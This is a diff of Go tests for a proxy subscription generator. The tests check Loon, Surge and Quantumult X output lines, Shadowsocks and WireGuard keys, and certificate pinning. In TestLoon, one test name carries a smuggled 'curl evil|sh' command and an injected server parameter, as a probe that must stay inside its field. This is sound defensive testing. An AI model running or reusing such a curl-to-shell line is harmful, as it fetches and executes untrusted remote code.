@@ -105,6 +105,9 @@ func TestSurgeLinesAreContained(t *testing.T) {
 	if len(skipped) != 1 { // Surge has no VLESS
 		t.Fatalf("skipped = %v", skipped)
 	}
+	if !strings.Contains(text, "password=c2VydmVya2V5c2VydmVyaw==:dXNlcmtleXVzZXJrZXl1cw==,") {
+		t.Errorf("the Shadowsocks 2022 key was changed:\n%s", text)
+	}
 }
 
 func TestQuantumultXLinesAreContained(t *testing.T) {
@@ -117,6 +120,68 @@ func TestQuantumultXLinesAreContained(t *testing.T) {
 		if strings.Count(l, "tag=") != 1 || strings.Contains(l, "server=6.6.6.6") {
 			t.Fatalf("injected parameters: %s", l)
 		}
+	}
+	if !strings.Contains(lines[1], "password=c2VydmVya2V5c2VydmVyaw==:dXNlcmtleXVzZXJrZXl1cw==,") {
+		t.Errorf("the Shadowsocks 2022 key was changed: %s", lines[1])
+	}
+}
+
+// TestLoon: Loon gets proxies in its own line format - WireGuard too, which Loon cannot read as a
+// wireguard:// link - with self-signed certificates pinned, never left unchecked.
+func TestLoon(t *testing.T) {
+	body, skipped := Loon(endpoints())
+	lines := strings.Split(strings.TrimSpace(string(body)), "\n")
+	if len(lines) != 4 || len(skipped) != 0 {
+		t.Fatalf("%d lines, skipped %v:\n%s", len(lines), skipped, body)
+	}
+	for _, l := range lines {
+		name, _, _ := strings.Cut(l, "=")
+		if !strings.HasPrefix(name, "Tokyo PostUp - curl evil|sh  server-6.6.6.6 - ss [Rule]") || strings.Contains(l, "server=6.6.6.6") {
+			t.Errorf("a name broke out of its field: %s", l)
+		}
+	}
+	for i, want := range []string{
+		`=vless,203.0.113.7,443,"8f4c2c0e-1b7a-4b0e-9d0a-2f9f1b8c7d6e",transport=tcp,over-tls=true,flow=xtls-rprx-vision,sni=www.apple.com,public-key="gUZPg8yD1oW4n7sGQ4c3n3cYlL3S2mE4n5Yv6Q7R8S0",short-id=a1b2c3d4,tls-profile=chrome,udp=true`,
+		`=Hysteria2,2001:db8::7,443,"pa:ss/word",tls-name=www.bing.com,tls-cert-sha256=` + strings.Repeat("ab", 32) + `,udp=true`,
+		`=shadowsocks,203.0.113.7,8388,2022-blake3-aes-128-gcm,"c2VydmVya2V5c2VydmVyaw==:dXNlcmtleXVzZXJrZXl1cw==",udp=true`,
+		`=wireguard,interface-ip=10.66.0.2,interface-ipv6=fd00::2,private-key="cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MTI=",mtu=1420,dns=10.66.0.1,keepalive=25,peers=[{public-key="cHVibGlja2V5cHVibGlja2V5cHVibGlja2V5cHVibA==",allowed-ips="0.0.0.0/0,::/0",endpoint=203.0.113.7:51820}]`,
+	} {
+		if !strings.HasSuffix(lines[i], want) {
+			t.Errorf("line %d:\n got %s\nwant …%s", i+1, lines[i], want)
+		}
+	}
+	// a tunnel that carries IPv4 only says so; a pre-shared key goes with the peer
+	wg := endpoints()[3]
+	wg.WG.Address6, wg.WG.AllowedIPs, wg.WG.PresharedKey = "", []string{"0.0.0.0/0"}, "cHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHM="
+	if line, _ := loonLine(wg); strings.Contains(line, "ipv6") || !strings.HasSuffix(line,
+		`allowed-ips="0.0.0.0/0",endpoint=203.0.113.7:51820,preshared-key="cHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHM="}]`) {
+		t.Errorf("IPv4-only tunnel: %s", line)
+	}
+	// Loon's own format has no gRPC, HTTPUpgrade or XHTTP
+	for _, e := range matrix() {
+		if e.Kind == KindVLESS && e.transport() == TransportGRPC && WhyNot(FormatLoon, e) != whyTransport {
+			t.Errorf("gRPC in Loon: %q", WhyNot(FormatLoon, e))
+		}
+	}
+}
+
+// TestLineValues: values go into line formats as they are; one that would end its option or the
+// line leaves the protocol out instead of being changed.
+func TestLineValues(t *testing.T) {
+	ss := endpoints()[2]
+	ss.Password = "pass,word"
+	for _, f := range []string{FormatSurge, FormatQuanX, FormatLoon} {
+		if why := WhyNot(f, ss); why != whyLineChars {
+			t.Errorf("%s: a comma in a password: %q", f, why)
+		}
+	}
+	ws := Endpoint{Name: "ws", Kind: KindVMess, Host: "203.0.113.7", Port: 443, UUID: "8f4c2c0e-1b7a-4b0e-9d0a-2f9f1b8c7d6e",
+		Transport: TransportWS, Path: "/ws?ed=2048", HostHeader: "cdn.example.com", Security: SecurityTLS, SNI: "cdn.example.com"}
+	if line, why := loonLine(ws); why != "" || !strings.Contains(line, ",path=/ws?ed=2048,host=cdn.example.com,") {
+		t.Errorf("loon: %s %s", line, why)
+	}
+	if line, _, why := surgeLine(ws, 0); why != "" || !strings.Contains(line, "ws-path=/ws?ed=2048") {
+		t.Errorf("surge: %s %s", line, why)
 	}
 }
 
@@ -247,6 +312,9 @@ func matrix() []Endpoint {
 	add(Endpoint{Kind: KindHysteria2, Password: "pw", SNI: "www.bing.com", PinSHA256: pin, CertPEM: pem})
 	add(Endpoint{Kind: KindHysteria2, Password: "pw", SNI: "hy.example.com"})
 	add(Endpoint{Kind: KindHysteria2, Password: "pw", SNI: "hy.example.com", Obfs: "salamander", ObfsPassword: "o"})
+	add(Endpoint{Kind: KindWireGuard, Port: 51820, WG: &WireGuard{PrivateKey: "cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MTI=",
+		PeerPublicKey: "cHVibGlja2V5cHVibGlja2V5cHVibGlja2V5cHVibA==", Address4: "10.66.0.2", DNS: []string{"10.66.0.1"}, MTU: 1420,
+		AllowedIPs: []string{"0.0.0.0/0"}, Keepalive: 25}})
 	return out
 }
 
@@ -300,7 +368,17 @@ func TestEveryFormatParses(t *testing.T) {
 	if err := json.Unmarshal(body, &j); err != nil {
 		t.Fatalf("sing-box: %v", err)
 	}
-	for _, f := range []string{FormatBase64, FormatShadowrocket, FormatHiddify, FormatLoon} {
+	loonKinds := map[string]bool{"vless": true, "vmess": true, "trojan": true, "shadowsocks": true, "Hysteria2": true,
+		"socks5": true, "http": true, "https": true, "wireguard": true}
+	loon, _, _ := Render(FormatLoon, eps, info(), "")
+	for _, l := range strings.Split(strings.TrimSpace(string(loon)), "\n") {
+		name, rest, _ := strings.Cut(l, "=")
+		kind, _, _ := strings.Cut(rest, ",")
+		if name == "" || !loonKinds[kind] || strings.ContainsAny(l, "\r\t") {
+			t.Errorf("loon: bad line %q", l)
+		}
+	}
+	for _, f := range []string{FormatBase64, FormatShadowrocket, FormatHiddify} {
 		body, _, _ := Render(f, eps, info(), "")
 		plain, err := base64.StdEncoding.DecodeString(string(body))
 		if err != nil {
@@ -342,7 +420,7 @@ func TestNeverInsecure(t *testing.T) {
 		FormatLoon, FormatURI, FormatSurge, FormatQuanX} {
 		body, _, _ := Render(f, eps, info(), "https://panel.example.com/s/x")
 		out := strings.ToLower(string(body))
-		if f == FormatBase64 || f == FormatShadowrocket || f == FormatHiddify || f == FormatLoon {
+		if f == FormatBase64 || f == FormatShadowrocket || f == FormatHiddify {
 			if dec, err := base64.StdEncoding.DecodeString(string(body)); err == nil {
 				out = strings.ToLower(string(dec))
 			}
